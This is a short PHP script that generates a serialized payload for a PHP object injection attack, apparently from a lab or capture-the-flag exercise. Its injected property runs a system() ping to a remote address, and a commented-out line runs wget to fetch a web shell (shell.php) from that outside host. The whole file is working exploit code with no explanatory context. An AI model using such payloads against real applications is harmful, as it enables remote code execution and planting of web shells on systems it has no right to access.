<?php
class PHPObjectInjection
{
    // public $inject = "system('wget http://10.10.14.20/shell.php -O shell.php');";
    public $inject = "system('ping -c 2 10.10.14.20');";
}

echo serialize(new PHPObjectInjection);
?>
